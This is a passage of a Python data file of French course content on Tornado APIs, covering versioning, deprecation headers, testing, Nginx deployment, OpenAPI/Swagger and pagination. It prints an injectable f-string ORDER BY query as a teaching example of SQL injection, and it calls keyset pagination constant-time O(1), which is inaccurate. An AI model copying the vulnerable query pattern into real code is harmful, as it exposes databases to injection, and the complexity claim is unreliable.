            "et si rarement `/api/v2/...` ?** Et si `v2` est si rare, pourquoi est-il pourtant obligatoire de préfixer ses routes par `/api/v1` "
            "dès le premier jour ?\n"
            "Ce chapitre répond en profondeur à ces deux questions d'architecture industrielle à travers les **Sous-tables de Routage Modulaires Tornado**, "
            "l'**Application Factory (`create_app`)**, la distinction entre **Évolution Rétrocompatible (*Non-Breaking*)** et **Rupture de Contrat (*Breaking Change*)**, "
            "ainsi que le protocole officiel de dépréciation **IETF RFC 8594 (`Deprecation` & `Sunset`)**."
        ),
        "deep_sections": [
            {
                "heading": "1. Pourquoi voit-on presque toujours `/api/v1` et rarement `/api/v2` ? (Loi de Postel & *Tolerant Reader*)",
                "body": (
                    "Dans l'industrie, une API bien conçue reste sur **`/api/v1` pendant 5 à 10 ans** parce que **90 % des évolutions fonctionnelles "
                    "sont additives et rétrocompatibles (*Non-Breaking Changes*)** :\n"
                    "- **Ce qui NE casse PAS les clients existants (On reste en `/api/v1`)** :\n"
                    "  1. **Ajouter un nouveau champ** dans la réponse JSON (ex: ajouter `\"certifiant\": true` à un objet formation) : selon le patron "
                    "*Tolerant Reader* (Loi de Postel), une application mobile ou React qui lit `data.intitule` ignore simplement les nouvelles clés JSON qu'elle ne connaît pas.\n"
                    "  2. **Ajouter une nouvelle route** (ex: `GET /api/v1/certificats`).\n"
                    "  3. **Ajouter un paramètre de requête optionnel** avec valeur par défaut (ex: `GET /api/v1/formations?lang=fr`).\n"
                    "- **Ce qui CASSE les clients existants (*Breaking Changes* -> Obligation de créer `/api/v2`)** :\n"
                    "  1. **Supprimer ou renommer une clé JSON existante** (ex: renommer `\"intitule\"` en `\"titre\"`).\n"
                    "  2. **Changer le type de données d'un champ** (ex: en `v1`, `\"duree\": 5` est un entier ; en `v2`, `\"duree\": {\"valeur\": 5, \"unite\": \"jours\"}` "
                    "devient un dictionnaire — tout client `v1` qui faisait `formation.duree * 7` plante immédiatement avec `TypeError` !).\n"
                    "  3. **Exiger un nouveau champ obligatoire** dans le corps d'un `POST` ou `PUT` sans valeur par défaut côté serveur.\n"
                    "- **Pourquoi mettre `/api/v1` dès le Jour 1 (« L'Assurance-Vie Architecturale ») ?** Avec `/api/v1/` présent dès l'origine, vous "
                    "déployez `/api/v2/` à côté de `/api/v1/` sans aucune interruption de service pour les applications mobiles déjà distribuées !"
                )
            },
            {
                "heading": "2. Comment faire coexister `/api/v1` et `/api/v2` dans Tornado et déprécier `v1` (Norme RFC 8594)",
                "body": (
                    "Lorsqu'une version `/api/v2` est créée, on ne coupe **jamais** `/api/v1` brutalement : on ouvre une **période de coexistence et de transition** "
                    "(généralement 6 à 12 mois) :\n"
                    "1. **Deux sous-tables de routage sur la même couche métier** : Dans Tornado, `FormationsV1Handler` (`/api/v1/formations`) et `FormationsV2Handler` "
                    "(`/api/v2/formations`) interrogent exactement la même couche métier mais formatent le dictionnaire JSON différemment.\n"
                    "2. **Signalement automatique de fin de vie via `set_default_headers(self)` sur `FormationsV1Handler` (RFC 8594)** : Chaque réponse de `/api/v1` inclut "
                    "trois en-têtes HTTP standards :\n"
                    "   - `Deprecation: true` : Signale officiellement que cette version de l'API est en fin de vie.\n"
                    "   - `Sunset: Thu, 31 Dec 2026 23:59:59 GMT` : Indique la date et l'heure exactes d'extinction définitive.\n"
                    "   - `Link: </api/v2/formations>; rel=\"successor-version\"` : Indique l'URL de la nouvelle version.\n"
                    "3. **Extinction finale (`410 Gone`)** : Une fois la date `Sunset` dépassée, `/api/v1` renvoie le code HTTP **`410 Gone`**."
                )
            },
            {
                "heading": "3. Découpage modulaire (`get_*_routes()`), *Application Factory* (`create_app`) & Sondes (`Liveness`/`Readiness`)",
                "body": (
                    "Au-delà du versioning, l'industrialisation d'une application Tornado repose sur trois piliers :\n"
                    "- **Les sous-tables de routage par domaine** : Chaque module (`get_web_routes()`, `get_v1_routes()`, `get_v2_routes()`, `get_health_routes()`) "
                    "retourne sa liste de tuples `(regex, HandlerClass)` assemblée dans `create_app()`.\n"
                    "- **L'Application Factory (`def create_app(config=None) -> tornado.web.Application:`)** : Instancie l'`Application` Tornado à la demande "
                    "pour la production comme pour les tests `AsyncHTTPTestCase`.\n"
                    "- **Les Sondes de Santé (*Healthchecks*)** :\n"
                    "  - `GET /api/health/live` (*Liveness Probe*) : Vérifie uniquement que l'`IOLoop` Tornado répond (`200 OK`).\n"
                    "  - `GET /api/health/ready` (*Readiness Probe*) : Vérifie que la base de données SQL répond (`200 OK` ou `503 Service Unavailable`)."
                )
            }
        ],
        "architecture_diagram": (
            "COEXISTENCE MULTI-VERSIONS (/api/v1 DÉPRÉCIÉE + /api/v2) DANS TORNADO\n"
            "=====================================================================\n\n"
            "  Clients Historiques (App Mobile v1)            Nouveaux Clients (Portail Web / App v2)\n"
            "  GET /api/v1/formations                         GET /api/v2/formations\n"
            "            |                                              |\n"
            "            v                                              v\n"
            "  +--------------------------------------------------------------------------+\n"
            "  | APPLICATION FACTORY : create_app() -> tornado.web.Application            |\n"
            "  |                                                                          |\n"
            "  |  [FormationsV1Handler]                      [FormationsV2Handler]        |\n"
            "  |  r'/api/v1/formations'                      r'/api/v2/formations'        |\n"
            "  |  + Headers RFC 8594 :                       + Enveloppe normalisée :     |\n"
            "  |    Deprecation: true                          {\"meta\": {...},            |\n"
            "  |    Sunset: Thu, 31 Dec 2026...                 \"data\": [{\"duree\": {      |\n"
            "  |  + Schéma plat : {\"duree\": 5}                    \"valeur\": 5, ...}}]}    |\n"
            "  +--------------------------------------------------------------------------+\n"
            "                                    \\          /\n"
            "                                     v        v\n"
            "                      [ Couche Métier & Base SQLite Unique ]"
        ),
        "reference_table": {
            "title": "Comparatif des 4 Stratégies de Versionnement d'API & Gestion des Changements",
            "headers": ["Stratégie / Mécanisme", "Exemple Concret", "Avantages Majeurs", "Usage Industriel"],
            "rows": [
                ["1. Versioning dans l'URI (*Path Versioning*)", "`GET /api/v1/formations` vs `/api/v2/formations`", "Immédiatement visible (logs Nginx, navigateur, `curl`), routage Reverse Proxy trivial", "80 % des APIs REST publiques (OpenAI, Twilio, PayPal, Kubernetes)"],
                ["2. Versioning par En-tête HTTP (*Header*)", "`X-API-Version: 2026-11-01` ou `Stripe-Version`", "URL permanente et immuable, permet un versionnement fin par date", "APIs financières et plateformes (Stripe, GitHub API)"],
                ["3. Négociation MIME (*Accept Header*)", "`Accept: application/vnd.isgp.v2+json`", "Respecte strictement la théorie REST pure (Content Negotiation)", "Systèmes hypermédias stricts"],
                ["4. En-têtes de Dépréciation (RFC 8594)", "`Deprecation: true` + `Sunset: <Date HTTP>`", "Permet aux clients de planifier leur migration de `v1` vers `v2` sans coupure brutale", "Toute API en phase de transition `v1 -> v2`"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Créer `/api/v2`, `/api/v3`, `/api/v4` chaque fois qu'on ajoute un simple champ optionnel ou une nouvelle route",
                "good": "Rester sur `/api/v1` pour tous les ajouts rétrocompatibles (*Additive Changes*) et réserver `/api/v2` aux vraies ruptures de contrat (*Breaking Changes*)",
                "why": "Multiplier les versions majeures fragmente la maintenance serveur. Grâce à la Loi de Postel, `v1` peut évoluer par ajouts pendant des années."
            },
            {
                "bad": "Renommer une clé JSON (`intitule` -> `titre`) ou changer son type (`5` -> `{'valeur': 5}`) directement dans `/api/v1`",
                "good": "Conserver l'ancien format sur `/api/v1` (avec les en-têtes `Deprecation` et `Sunset`) et publier la rupture de schéma sur `/api/v2`",
                "why": "Modifier le contrat de `v1` en place provoque le crash immédiat des applications mobiles et scripts clients déjà déployés."
            }
        ],
        "practical_exercises": [
            "Dans le Sandbox HTTP ou avec `curl -i http://127.0.0.1:8888/api/v1/sandbox/formations`, inspectez les en-têtes HTTP de dépréciation (`Deprecation`, `Sunset`, `Link`), puis appelez `/api/v2/sandbox/formations` pour comparer la transformation du champ `duree`.",
            "Exécutez `day_5/03_architecture_blueprints.py` pour observer la coexistence de `v1`, `v2`, du portail HTML et des sondes Healthcheck."
        ]
    },

    # =========================================================================
    # JOUR 5 — CHAPITRE 5.3 : TESTS AUTOMATISÉS (TORNADO.TESTING), OPENAPI 3.0 & DÉPLOIEMENT CLUSTER NGINX
    # =========================================================================
    "d5-l3": {
        "context": (
            "Comment une équipe d'ingénieurs peut-elle déployer une mise à jour de son API Tornado le jeudi après-midi "
            "avec la certitude absolue qu'elle n'a cassé aucune des 120 routes existantes ?\n"
            "Tester manuellement chaque route avec `curl` ou Postman après chaque modification de code devient "
            "humainement impossible dès la deuxième semaine d'un projet. Par ailleurs, comment exploiter tous les cœurs CPU "
            "d'un serveur Linux de production avec Tornado derrière un répartiteur de charge Nginx ?\n"
            "Ce chapitre réunit les trois piliers de l'industrialisation : **Tests automatisés (`tornado.testing.AsyncHTTPTestCase`)**, "
            "**Spécification OpenAPI 3.0** et **Architecture de déploiement multi-instances (`Nginx + Tornado HTTPServer(xheaders=True)`)**."
        ),
        "deep_sections": [
            {
                "heading": "1. Tests d'intégration automatisés ultra-rapides avec `tornado.testing.AsyncHTTPTestCase`",
                "body": (
                    "Tornado intègre nativement un framework de test asynchrone complet dans **`tornado.testing.AsyncHTTPTestCase`** :\n"
                    "- **Cycle automatisé** : Il suffit de définir `def get_app(self): return create_app()`. Pour chaque test, Tornado démarre "
                    "une `IOLoop` isolée sur un port éphémère libre et fournit la méthode **`self.fetch(\"/api/v1/formations\", method=..., body=..., headers=...)`**.\n"
                    "- **Les 3 assertions indispensables d'un test d'API Tornado** :\n"
                    "  1. Vérifier le **code de statut HTTP** : `self.assertEqual(resp.code, 201)`.\n"
                    "  2. Vérifier les **en-têtes HTTP** : `self.assertIn(\"application/json\", resp.headers[\"Content-Type\"])`.\n"
                    "  3. Vérifier la **structure et les valeurs du corps JSON** : `data = tornado.escape.json_decode(resp.body); self.assertEqual(data[\"id\"], 2)`.\n"
                    "- **Règle d'or de qualité logicielle** : Pour chaque `RequestHandler`, écrivez au minimum un test du **cas nominal (*Happy Path*)** "
                    "et des tests pour les **cas d'erreur (*Unhappy Paths* : `400`, `401`, `403`, `404`, `422`)**."
                )
            },
            {
                "heading": "2. Le contrat universel `OpenAPI 3.0` (anciennement Swagger) sur `/api/openapi.json`",
                "body": (
                    "Une API sans documentation à jour est une API inutilisable. Le standard mondial pour décrire formellement "
                    "une API REST est la **spécification OpenAPI 3.0 (OAS)** :\n"
                    "- Il s'agit d'un document structuré (en JSON ou YAML), exposé par un `OpenAPIHandler` sur `GET /api/openapi.json`, qui décrit "
                    "de manière lisible à la fois par l'humain et par la machine :\n"
                    "  - Les métadonnées de l'API (`info.title`, `info.version`).\n"
                    "  - La liste exhaustive des chemins (`paths`) et méthodes HTTP (`get`, `post`, `delete`).\n"
                    "  - Les paramètres attendus (`parameters`), les schémas des corps JSON (`requestBody`) et des réponses (`responses`).\n"
                    "  - Les schémas de sécurité (`components.securitySchemes`, ex: `bearerAuth`)."
                )
            },
            {
                "heading": "3. Déploiement Production : L'architecture `Nginx -> 4 Instances Tornado HTTPServer(xheaders=True)`",
                "body": (
                    "Bien qu'un seul processus Tornado puisse gérer des milliers de connexions simultanées grâce à son `IOLoop` non bloquant, "
                    "un processus Python unique n'utilise qu'**un seul cœur CPU** (à cause du *GIL — Global Interpreter Lock*).\n"
                    "En production sur Linux (VM, Docker ou Cloud), une API Tornado se déploie selon l'architecture officielle recommandée par Tornado :\n"
                    "1. **Étage 1 — Le Proxy Inverse & Load Balancer (`Nginx`)** : Placé en première ligne sur les ports `80` et `443`, il gère "
                    "le chiffrement **HTTPS/TLS**, sert directement les fichiers `/static/` depuis le disque (`sendfile on`), et répartit les requêtes "
                    "API en *Round-Robin* ou *Least Connections* vers le bloc `upstream isgp_tornado_cluster`.\n"
                    "2. **Étage 2 — Le Cluster Multi-Processus Tornado (`127.0.0.1:8001` à `8004`)** : On lance 1 processus Tornado par cœur CPU "
                    "(ex: 4 instances sur les ports `8001` à `8004`) avec **`tornado.httpserver.HTTPServer(app, xheaders=True)`**.\n"
                    "3. **Rôle vital de `xheaders=True`** : Indique à `HTTPServer` de faire confiance aux en-têtes `X-Forwarded-For`, `X-Real-IP` "
                    "et `X-Forwarded-Proto` injectés par Nginx afin que `self.request.remote_ip` contienne la vraie IP du client !"
                )
            }
        ],
        "architecture_diagram": (
            "ARCHITECTURE DE DÉPLOIEMENT DE PRODUCTION LINUX (NGINX + CLUSTER 4 INSTANCES TORNADO)\n"
            "=====================================================================================\n\n"
            "  Internet (HTTPS :443)\n"
            "        |\n"
            "        v\n"
            "  +-------------------------------------------------------------------+\n"
            "  | 1. NGINX (Reverse Proxy & Load Balancer)                          |\n"
            "  |    - Terminaison SSL/TLS + Fichiers /static/ (sendfile on)        |\n"
            "  |    - Injecte X-Real-IP, X-Forwarded-For, X-Forwarded-Proto        |\n"
            "  +-------------------------------------------------------------------+\n"
            "        |  (upstream isgp_tornado_cluster : ports 8001 à 8004)\n"
            "     +--+---------------+------------------+------------------+\n"
            "     |                  |                  |                  |\n"
            "     v                  v                  v                  v\n"
            "  [Node 1 :8001]     [Node 2 :8002]     [Node 3 :8003]     [Node 4 :8004]\n"
            "  HTTPServer         HTTPServer         HTTPServer         HTTPServer\n"
            "  (xheaders=True)    (xheaders=True)    (xheaders=True)    (xheaders=True)\n"
            "  IOLoop Cœur 1      IOLoop Cœur 2      IOLoop Cœur 3      IOLoop Cœur 4\n"
            "     \\                  |                  |                  /\n"
            "      +-----------------+------------------+-----------------+\n"
            "                                   |\n"
            "                                   v\n"
            "                    [ Base de Données SQL / Redis ]"
        ),
        "reference_table": {
            "title": "Comparatif : Instance Unique de Dev vs Cluster Tornado Production (`Nginx + 4 x HTTPServer`)",
            "headers": ["Critère d'Exploitation", "Serveur de Dev (`python app.py`)", "Cluster Production (`Nginx + 4 instances Tornado`)"],
            "rows": [
                ["Vocation", "Développement local et débogage sur le poste du développeur", "Production haute disponibilité exposée aux utilisateurs réels"],
                ["Parallélisme multi-cœurs", "Non (1 seul processus Python sur 1 cœur CPU)", "Oui (`N` processus Tornado indépendants dotés chacun de leur `IOLoop`)"],
                ["Restitution de l'IP cliente", "Directe (`127.0.0.1`)", "Automatique via `HTTPServer(app, xheaders=True)` lisant `X-Forwarded-For`"],
                ["Fichiers statiques (`/static/`)", "Servis par Python (`StaticFileHandler`)", "Servis directement par le noyau Linux via Nginx (`sendfile on`)"],
                ["Mode Debug (`debug=True`)", "Activé en local (`autoreload`)", "**Strictement `debug=False` en prod**"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Oublier `xheaders=True` sur `tornado.httpserver.HTTPServer` lorsque Tornado est placé derrière Nginx",
                "good": "Toujours instancier `tornado.httpserver.HTTPServer(app, xheaders=True)` derrière un Reverse Proxy de confiance",
                "why": "Sans `xheaders=True`, `self.request.remote_ip` vaut toujours `127.0.0.1` (l'IP de Nginx), ce qui fausse les logs d'audit et bloque tout le monde au même quota de Rate Limiting !"
            },
            {
                "bad": "N'écrire des tests automatisés que pour les cas de succès (`200 OK`)",
                "good": "Tester systématiquement les cas d'erreur (`400`, `401`, `403`, `404`, `422`) avec `AsyncHTTPTestCase`",
                "why": "Les régressions de sécurité et les crashs en production surviennent presque toujours sur les entrées invalides ou non autorisées."
            }
        ],
        "practical_exercises": [
            "Exécutez `day_5/04_tests_et_production.py` pour lancer la suite de 6 tests `AsyncHTTPTestCase` et vérifier la restitution d'IP via `xheaders=True`.",
            "Explorez l'onglet **Cluster Nginx (4x)** dans l'interface du laboratoire pour simuler la répartition de charge entre les 4 nœuds Tornado (`8001` à `8004`)."
        ]
    },

    # =========================================================================
    # JOUR 5 — CHAPITRE 5.4 : DOCUMENTATION INTERACTIVE SWAGGER UI & CONTRAT OPENAPI 3.0
    # =========================================================================
    "d5-l4": {
        "context": (
            "Dans une entreprise où l'équipe Backend Python développe une API Tornado consommée par une équipe Mobile (iOS/Android), "
            "une équipe Frontend (React/Vue) et des partenaires externes, comment communiquer la liste des URLs, les types "
            "de chaque champ JSON et les jetons requis ?\n"
            "Si vous rédigez un document Word ou un fichier PDF, **il devient obsolète dès la semaine suivante** dès qu'un "
            "développeur ajoute ou modifie un champ dans un `RequestHandler`.\n"
            "L'industrie mondiale a résolu ce problème grâce au standard **OpenAPI 3.0 (anciennement Swagger)** couplé au "
            "portail Web interactif **Swagger UI (`/api/docs`)** : un contrat unique, lisible à la fois par les machines "
            "et par les humains, permettant de tester chaque route en direct depuis le navigateur."
        ),
        "deep_sections": [
            {
                "heading": "1. Histoire et distinction exacte : `OpenAPI Specification (OAS)` vs `Swagger`",
                "body": (
                    "En entretien comme en réunion d'architecture, il est essentiel de connaître la distinction exacte entre ces deux termes :\n"
                    "- **2010–2015 (*Swagger 1.0 et 2.0*)** : Créé initialement par Tony Tam chez Wordnik puis racheté par SmartBear.\n"
                    "- **Novembre 2015 (Création de l'*OpenAPI Initiative*)** : SmartBear fait don de la spécification à la **Linux Foundation** "
                    "(avec Google, Microsoft, IBM, Stripe). La norme s'appelle désormais officiellement **OpenAPI Specification (OAS 3.0 / 3.1)**.\n"
                    "- **Aujourd'hui** :\n"
                    "  - **`OpenAPI 3.0`** désigne la **règle / la grammaire standard** du fichier de contrat (`openapi.json` ou `openapi.yaml`).\n"
                    "  - **`Swagger`** désigne la **boîte à outils** qui manipule ce fichier :\n"
                    "    1. **`Swagger UI`** : L'application Web HTML/JS qui lit `/api/openapi.json` et génère le portail interactif avec les boutons *« Try it out »* et *« Authorize »*.\n"
                    "    2. **`Swagger Editor`** : L'éditeur avec validation syntaxique en temps réel.\n"
                    "    3. **`Swagger Codegen` / `OpenAPI Generator`** : L'outil qui génère automatiquement le code client (Python, TypeScript, Kotlin, Swift) ou une collection Postman à partir de `openapi.json`."
                )
            },
            {
                "heading": "2. Anatomie chirurgicale d'un contrat OpenAPI 3.0 (`paths`, `$ref`, `securitySchemes`)",
                "body": (
                    "Un document OpenAPI 3.0 (`openapi: \"3.0.3\"`) s'articule autour de cinq sections maîtresses :\n"
                    "1. **`info` & `servers`** : Identifient le titre de l'API, sa version sémantique (`1.0.0`) et les URLs des environnements (`http://127.0.0.1:8888`).\n"
                    "2. **`paths` (Les routes avec syntaxe `{variable}`)** : Contrairement à Tornado qui utilise des regex `([0-9]+)` et Postman qui utilise `:id`, "
                    "**OpenAPI impose les accolades `{id}`** (`/api/v1/formations/{id}`). Chaque chemin détaille les méthodes (`get`, `post`, `put`, `delete`), "
                    "les `parameters` (`in: \"path\"`, `in: \"query\"`, `in: \"header\"`), le `requestBody` et toutes les `responses` (`200`, `201`, `401`, `403`, `422`).\n"
                    "3. **`components.schemas` et les pointeurs `$ref`** : On définit une seule fois la structure d'une `Formation` ou d'une `ErreurRFC7807` "
                    "dans `components.schemas` et on la pointe partout avec `{\"$ref\": \"#/components/schemas/Formation\"}`.\n"
                    "4. **`components.securitySchemes` (Le bouton cadenas *Authorize*)** : C'est cette section qui active le bouton **« Authorize »** en haut à droite "
                    "de Swagger UI pour permettre de saisir un **`Bearer Token` JWT** (`type: \"http\", scheme: \"bearer\"`) ou une **`X-API-Key`** (`type: \"apiKey\", in: \"header\"`)."
                )
            },
            {
                "heading": "3. Comment intégrer Swagger UI dans Tornado : `OpenAPISpecHandler` + `SwaggerUIHandler`",
                "body": (
                    "Dans l'écosystème Tornado, deux approches complémentaires sont utilisées :\n"
                    "1. **Approche Native Explicite (`/api/openapi.json` + `SwaggerUIHandler`)** : Comme démontré dans `day_5/05_swagger_openapi_ui.py` et sur "
                    "notre propre serveur (`/api/docs`), il suffit d'un `OpenAPISpecHandler` appelant `self.write(SPEC)` et d'un `SwaggerUIHandler` de 20 lignes "
                    "chargeant `SwaggerUIBundle`. **Avantage** : zéro dépendance externe complexe, maîtrise totale du contrat.\n"
                    "2. **Extensions (`apispec` + `tornado-swagger`) ou approche *Contract-First*** : Génèrent ou valident `openapi.yaml` dans le pipeline CI/CD."
                )
            }
        ],
        "architecture_diagram": (
            "ÉCOSYSTÈME OPENAPI 3.0 : UN SEUL CONTRAT POUR TOUS LES OUTILS\n"
            "=============================================================\n\n"
            "                    +---------------------------------------+\n"
            "                    | Serveur Tornado (/api/openapi.json)   |\n"
            "                    | Contrat OpenAPI 3.0.3 (JSON/YAML)     |\n"
            "                    +-------------------+-------------------+\n"
            "                                        |\n"
            "         +------------------------------+-----------------------------+\n"
            "         |                              |                             |\n"
            "         v                              v                             v\n"
            "  +--------------+              +---------------+             +---------------+\n"
            "  |  SWAGGER UI  |              |  POSTMAN /    |             | OPENAPI       |\n"
            "  |  (/api/docs) |              |  INSOMNIA     |             | GENERATOR     |\n"
            "  |  Portail Web |              |  Import 1-clic|             | Génère les SDK|\n"
            "  |  Interactif  |              |  Collection   |             | Mobile & Web  |\n"
            "  +--------------+              +---------------+             +---------------+"
        ),
        "reference_table": {
            "title": "Structure de Référence d'un Document OpenAPI 3.0 (`openapi.json`)",
            "headers": ["Clé Racine OpenAPI 3.0", "Rôle dans le Contrat", "Exemple de Contenu", "Impact Visuel dans Swagger UI (`/api/docs`)"],
            "rows": [
                ["`openapi` & `info`", "Version de la norme et identité de l'API", "`\"openapi\": \"3.0.3\", \"info\": {\"title\": \"...\", \"version\": \"1.0.0\"}`", "Affiche l'en-tête principal, le badge de version et la description"],
                ["`servers`", "Liste des URLs de base cibles", "`[{\"url\": \"http://127.0.0.1:8888\"}]`", "Alimente la liste déroulante *Servers* pour choisir où envoyer les requêtes"],
                ["`paths`", "Catalogue des routes et méthodes HTTP", "`\"/api/v1/formations/{id}\": {\"get\": {...}}`", "Crée les bandeaux colorés dépliables (`GET` bleu, `POST` vert, `PUT` orange, `DELETE` rouge)"],
                ["`components.schemas`", "Modèles de données JSON réutilisables (`$ref`)", "`\"Formation\": {\"type\": \"object\", \"properties\": {...}}`", "Alimente la section *Schemas* en bas de page et pré-remplit les exemples *Try it out*"],
                ["`components.securitySchemes`", "Définition des mécanismes d'authentification", "`\"BearerAuth\": {\"type\": \"http\", \"scheme\": \"bearer\"}`", "Affiche le bouton cadenas vert **« Authorize »** en haut à droite et sur chaque route protégée"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Écrire `/api/v1/formations/([0-9]+)` (syntaxe Regex Tornado) à l'intérieur du fichier `openapi.json`",
                "good": "Toujours utiliser la syntaxe entre accolades `/api/v1/formations/{id}` dans la section `paths` d'OpenAPI 3.0",
                "why": "La norme OpenAPI (RFC 6570) ne reconnaît que `{id}` pour relier l'URL au paramètre `{\"name\": \"id\", \"in\": \"path\"}` dans Swagger UI."
            },
            {
                "bad": "Laisser la documentation Swagger accessible publiquement en production sur une API interne critique sans authentification si elle expose l'architecture interne",
                "good": "Protéger l'accès à `/api/docs` sur les APIs privées d'administration ou la réserver au réseau interne / portail développeur",
                "why": "Sur une API privée non destinée au public, exposer `/api/openapi.json` facilite la phase de reconnaissance d'un attaquant."
            }
        ],
        "practical_exercises": [
            "Ouvrez le portail Swagger UI intégré à ce laboratoire (`/api/docs`), cliquez sur le bouton cadenas **« Authorize »**, entrez la clé `isgp-secret-2026` dans `ApiKeyAuth`, puis testez la route `GET /api/sandbox/admin-stats` avec **« Try it out »**.",
            "Dans `day_5/05_swagger_openapi_ui.py`, ajoutez la documentation de la méthode `DELETE /api/v1/formations/{id}` sous la clé `paths[\"/api/v1/formations/{id}\"]` avec les réponses `200` et `404`."
        ]
    },

    # =========================================================================
    # JOUR 5 — CHAPITRE 5.5 : INGÉNIERIE DE COLLECTION EN PRODUCTION (PAGINATION OFFSET VS CURSOR, FILTRAGE & TRI SÉCURISÉ)
    # =========================================================================
    "d5-l5": {
        "context": (
            "Dans un prototype pédagogique, `SELECT * FROM formations` renvoie 5 lignes en 1 milliseconde. "
            "Mais après deux ans en production, votre table `factures`, `journaux_audit` ou `inscriptions` contient "
            "**2 millions d'enregistrements**. Si un client appelle `GET /api/v1/inscriptions` et que Tornado tente de "
            "charger et sérialiser les 2 millions de lignes d'un coup, la mémoire vive (RAM) explose, l'`IOLoop` gèle "
            "et le serveur s'effondre pour tous les utilisateurs.\n"
            "Ce chapitre de clôture 100 % Tornado vous donne les armes d'ingénierie de données utilisées sur les APIs à fort trafic : "
            "la **Pagination par `Offset/Limit`**, la **Pagination par Curseur (`Keyset Pagination`) en temps constant $O(1)$**, "
            "le **Filtrage multi-critères** et le **Tri dynamique protégé par liste blanche (`Whitelist`)**."
        ),
        "deep_sections": [
            {
                "heading": "1. Pagination par `Offset / Limit` (`?page=2&per_page=20`) : Fonctionnement et Limite SQL",
                "body": (
                    "La pagination classique par numéro de page repose sur deux paramètres d'URL (`page` et `per_page`) :\n"
                    "- **Calcul de l'Offset** : `offset = (page - 1) * per_page`. Pour la page 3 avec 20 éléments par page, on saute les `40` premiers "
                    "éléments (`SELECT * FROM formations ORDER BY id ASC LIMIT 20 OFFSET 40`).\n"
                    "- **Plafonnement défensif obligatoire** : Ne laissez jamais un client demander `?per_page=1000000` ! Imposez toujours un plafond "
                    "côté serveur : `per_page = min(50, max(1, int(self.get_query_argument(\"per_page\", \"20\"))))`.\n"
                    "- **Pourquoi `OFFSET` ralentit sur les très grandes tables** : Lorsque la base SQL exécute `LIMIT 20 OFFSET 500000`, le moteur "
                    "doit quand même lire, trier et traverser les **500 000 premières lignes** sur le disque avant de les jeter pour ne garder que les 20 suivantes."
                )
            },
            {
                "heading": "2. Pagination Haute Performance par `Curseur / Keyset` (`?after_id=1042&limit=20`)",
                "body": (
                    "Pour éliminer la lenteur d'`OFFSET` sur les flux infinis ou les tables de plusieurs millions de lignes, les grandes APIs "
                    "industrielles utilisent la **Pagination par Curseur (*Cursor / Keyset Pagination*)** :\n"
                    "- Au lieu de demander « la page 25 000 », le client indique l'identifiant (ou le timestamp) du **dernier élément qu'il a reçu** : "
                    "`GET /api/v1/catalogue/cursor?after_id=1042&limit=20`.\n"
                    "- **Requête SQL en temps constant $O(1)$** : `SELECT * FROM formations WHERE id > ? ORDER BY id ASC LIMIT ?` avec `(after_id, limit)`.\n"
                    "- Comme la colonne `id` possède un index B-Tree (clé primaire), SQLite/PostgreSQL saute **instantanément** à l'enregistrement `1043` "
                    "en moins d'une milliseconde, qu'il s'agisse du début ou de la fin d'une table de 50 millions de lignes !"
                )
            },
            {
                "heading": "3. Filtrage Multi-Critères et Tri Dynamique Sécurisé par Liste Blanche (`CHAMPS_TRI_AUTORISES`)",
                "body": (
                    "Une API professionnelle permet au client de filtrer et trier les collections (`?domaine=Securite&duree_min=4&sort=-tarif_dzd`) :\n"
                    "- **Danger d'injection SQL dans `ORDER BY`** : Les marqueurs paramétrés `?` de SQLite ne peuvent remplacer que des **valeurs** "
                    "(`WHERE domaine = ?`), ils ne peuvent pas remplacer un **nom de colonne** dans `ORDER BY`.\n"
                    "- Si un développeur écrit `f\"SELECT * FROM formations ORDER BY {self.get_query_argument('sort')}\"`, il ouvre une **faille d'injection SQL critique** !\n"
                    "- **La règle absolue de la Liste Blanche (*Whitelist*)** : Vérifiez toujours que le nom de colonne nettoyé appartient à un ensemble "
                    "Python figé (`if cle_tri not in {\"id\", \"duree_jours\", \"tarif_dzd\", \"titre\"}: self.set_status(422) ...`) avant d'exécuter le tri."
                )
            }
        ],
        "architecture_diagram": (
            "COMPARAISON SQL : PAGINATION OFFSET O(N) VS PAGINATION CURSEUR KEYSET O(1)\n"
            "==========================================================================\n\n"
            "  [A] OFFSET / LIMIT (?page=5000&per_page=20 -> OFFSET 99980) :\n"
            "  Table SQL : [Ligne 1 .................... Ligne 99980] ---> [Lignes 99981 à 100000]\n"
            "               \\___ Balayage séquentiel coûteux O(N) __/       \\__ Renvoyées (20) __/\n\n"
            "  [B] CURSEUR KEYSET (?after_id=99980&limit=20 -> WHERE id > 99980 LIMIT 20) :\n"
            "  Index B-Tree sur 'id' ----(Saut direct O(1))----> [Lignes 99981 à 100000]\n"
            "                                                     \\__ Renvoyées en < 1ms + next_cursor=100000"
        ),
        "reference_table": {
            "title": "Comparatif Industriel : Pagination `Offset/Limit` vs Pagination par `Curseur (Keyset)`",
            "headers": ["Critère d'Ingénierie", "Pagination `Offset / Limit` (`?page=2&per_page=20`)", "Pagination `Curseur / Keyset` (`?after_id=1042&limit=20`)"],
            "rows": [
                ["Requête SQL sous-jacente", "`SELECT * FROM table ORDER BY id LIMIT ? OFFSET ?`", "`SELECT * FROM table WHERE id > ? ORDER BY id LIMIT ?`"],
                ["Complexité algorithmique SQL", "$O(N)$ — Ralentit à mesure que `OFFSET` augmente", "$O(1)$ — Temps constant ultra-rapide via l'index B-Tree"],
                ["Saut direct vers une page (`Page 14`)", "Oui (idéal pour les grilles Web numérotées)", "Non (navigation séquentielle *Suivant / Précédent*)"],
                ["Stabilité en cas d'insertion temps réel", "Risque de décalage (un élément peut apparaître 2 fois)", "100 % stable (ancré sur l'identifiant unique `after_id`)"]
            ]
        },
        "pitfalls": [
            {
                "bad": "Accepter le paramètre `?per_page=` ou `?limit=` du client sans imposer de plafond maximum côté serveur",
                "good": "Toujours borner la limite : `per_page = min(50, max(1, int(self.get_query_argument('per_page', '20'))))`",
                "why": "Sans plafond `min(50, ...)`, un attaquant peut envoyer `?per_page=99999999` et provoquer un déni de service par saturation RAM."
            },
            {
                "bad": "Injecter directement le paramètre `?sort=` dans une requête SQL sans validation",
                "good": "Valider systématiquement la clé de tri contre un `set` Python (`CHAMPS_TRI_AUTORISES`) et renvoyer `422` en cas d'écart",
                "why": "C'est le seul moyen d'autoriser un tri dynamique tout en garantissant l'impossibilité absolue d'une injection SQL."
            }
        ],
        "practical_exercises": [
            "Exécutez `day_5/02_pagination_filtrage_production.py` et observez comment `next_cursor` dans `/api/v1/catalogue/cursor` permet de parcourir toute la collection de 2 en 2 jusqu'à ce que `next_cursor` vaille `None`.",
